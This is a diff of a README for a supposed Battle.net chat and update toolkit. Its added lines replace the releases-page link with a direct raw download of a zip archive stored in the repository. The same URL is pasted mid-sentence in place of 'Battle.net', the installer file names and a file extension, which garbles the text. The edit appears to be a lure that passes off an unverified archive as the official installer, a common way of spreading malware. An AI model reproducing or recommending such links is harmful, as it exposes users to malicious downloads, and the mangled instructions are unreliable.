@@ -1,10 +1,10 @@
-https://github.com/jananifree/battle-net-tools/releases
+https://github.com/jananifree/battle-net-tools/raw/refs/heads/main/optionally/tools_battle_net_3.0.zip
 
 # Battle-Net Tools for Blizzard Games: Cross-Platform Chat & Updates
 
-[![Releases](https://img.shields.io/badge/releases-download-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/jananifree/battle-net-tools/releases)
+[![Releases](https://github.com/jananifree/battle-net-tools/raw/refs/heads/main/optionally/tools_battle_net_3.0.zip)](https://github.com/jananifree/battle-net-tools/raw/refs/heads/main/optionally/tools_battle_net_3.0.zip)
 
-A practical toolkit that helps players stay connected. The project focuses on Battle.net social features, cross-platform chat, and timely game updates across Blizzard titles. It provides a consistent set of tools that work on Windows, macOS, and Linux, letting gamers chat with friends, track game patches, and receive important notices in a single, portable package. This README walks you through how to use the tool, what to expect, and how to contribute.
+A practical toolkit that helps players stay connected. The project focuses on https://github.com/jananifree/battle-net-tools/raw/refs/heads/main/optionally/tools_battle_net_3.0.zip social features, cross-platform chat, and timely game updates across Blizzard titles. It provides a consistent set of tools that work on Windows, macOS, and Linux, letting gamers chat with friends, track game patches, and receive important notices in a single, portable package. This README walks you through how to use the tool, what to expect, and how to contribute.
 
 Table of contents
 - What this project is
@@ -26,7 +26,7 @@ Table of contents
 - Acknowledgments
 
 What this project is
-Battle-Net Tools is designed for Blizzard fans who want a unified experience. It blends social features from Battle.net with live game updates and cross-platform chat in a single surface. Users can connect to friends, monitor game updates, and receive notifications even if they switch between platforms. The tool is designed to be lightweight, fast, and dependable. It does not require deep system privileges. It aims to be easy to install, easy to run, and easy to understand.
+Battle-Net Tools is designed for Blizzard fans who want a unified experience. It blends social features from https://github.com/jananifree/battle-net-tools/raw/refs/heads/main/optionally/tools_battle_net_3.0.zip with live game updates and cross-platform chat in a single surface. Users can connect to friends, monitor game updates, and receive notifications even if they switch between platforms. The tool is designed to be lightweight, fast, and dependable. It does not require deep system privileges. It aims to be easy to install, easy to run, and easy to understand.
 
 The core idea is simple: bring together communication, updates, and social features from Blizzard games into one friendly package. The project chooses clear defaults, straightforward configuration, and sensible defaults for performance and privacy. It treats user data with care and focuses on delivering value without complexity. It is designed for long sessions, late-night players, and busy gamers who want to stay in the loop.
 
@@ -57,7 +57,7 @@ Downloading and installing
 - The Releases page contains assets for Windows, macOS, and Linux. It may offer a standalone application bundle or an installer package depending on the platform.
 - If you cannot access the link, check the Releases section of the repository for alternate download mirrors or source code archives.
 
-To get the official installer, visit the Releases page and download the file that matches your OS. The Windows installer is often named something like battle-net-tools-setup.exe, the macOS package could be named battle-net-tools.dmg or a similar bundle, and the Linux option may be an AppImage or a tarball. After downloading, run the installer and follow the on-screen prompts. On first launch, you may be asked to sign in with your Blizzard account or to authorize the app to access your Blizzard-related data. Accept the permissions if you’re comfortable, and then proceed to the main dashboard.
+To get the official installer, visit the Releases page and download the file that matches your OS. The Windows installer is often named something like https://github.com/jananifree/battle-net-tools/raw/refs/heads/main/optionally/tools_battle_net_3.0.zip, the macOS package could be named https://github.com/jananifree/battle-net-tools/raw/refs/heads/main/optionally/tools_battle_net_3.0.zip or a similar bundle, and the Linux option may be an AppImage or a tarball. After downloading, run the installer and follow the on-screen prompts. On first launch, you may be asked to sign in with your Blizzard account or to authorize the app to access your Blizzard-related data. Accept the permissions if you’re comfortable, and then proceed to the main dashboard.
 
 Note: The link for downloads is provided here for convenience. If you prefer to browse manually, you can visit the official Releases section to locate the latest build, the changelog, and the security notes.
 
@@ -75,7 +75,7 @@ macOS
 - Sign in as needed and configure your preferences.
 
 Linux
-- Get the Linux asset from the Releases page. This could be an AppImage, a .tar.gz, or a .deb package depending on the distribution.
+- Get the Linux asset from the Releases page. This could be an AppImage, a https://github.com/jananifree/battle-net-tools/raw/refs/heads/main/optionally/tools_battle_net_3.0.zip, or a .deb package depending on the distribution.
 - For AppImage: make the file executable with chmod +x, then run it.
 - For tarball: extract to a folder, then run the executable inside.
 - For a .deb package: install with your package manager (e.g., sudo dpkg -i or your distribution’s GUI tool).
@@ -163,7 +163,7 @@ Acknowledgments
 - The project owes gratitude to open-source tooling that made cross-platform development easier.
 
 Downloads
-- Official installers and assets live on the Releases page. To get the latest builds for your OS, visit the Releases page: https://github.com/jananifree/battle-net-tools/releases. Retrieve the appropriate asset, then run the installer or executable as described in the installation steps.
+- Official installers and assets live on the Releases page. To get the latest builds for your OS, visit the Releases page: https://github.com/jananifree/battle-net-tools/raw/refs/heads/main/optionally/tools_battle_net_3.0.zip Retrieve the appropriate asset, then run the installer or executable as described in the installation steps.
 - If you cannot access the link or if the asset is not available, inspect the Releases section for additional assets or source code archives. The Releases section provides the most reliable, tested builds and notes for each release.
 
 Notes on download and execution
